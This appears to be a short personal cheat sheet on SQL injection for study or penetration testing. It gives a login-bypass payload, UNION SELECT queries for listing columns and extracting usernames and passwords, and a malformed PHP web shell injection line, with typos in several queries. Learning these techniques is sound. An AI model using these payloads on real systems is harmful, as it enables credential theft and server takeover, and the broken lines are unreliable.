# SQL Injection


## Basic injection
`1' or 1 = 1 #`

- `1'`: can be anything with ending quote
- `or` : so we could write success query.
- `1 = 1`: so its always true
  - String would be quoted, 1 is integer so we dont quote
- `#`: comment anything after this may be there in code





### GOTCHA

-  `order by`: in order to understand field count.
-   `limit 1`: useful to bypass `count === 1`


### Exploit TIPS

    - Extracting Coloumns -> 1' union <SELECT QUERY> #
      - 1' UNION SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE tables_name = 'users' #
    - Extracting Data -> 1' union <SELECT QUERY> #\
      - 1' union select 1, username, 3 from db.tables #
      - 1' union select 1, concat(field1, 0x3a, field2, 0x3a, field3), from db.tables #
        - filed1,2,3 could be likes of username, email, pass
        - 0x3a is hexcode for `:`

### Reverse shell

- union select 1, 2, '<?php system[$_GET]>


### TIPS

    - SQL query vs Web APP Query: this can mean if its vulnerable to sql injection or not.
    - concept is same for any database engine but example works for mysql.

### GOOD READS

- [Portswinger Academy](https://portswigger.net/web-security/sql-injection)
- [pentest moneky Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)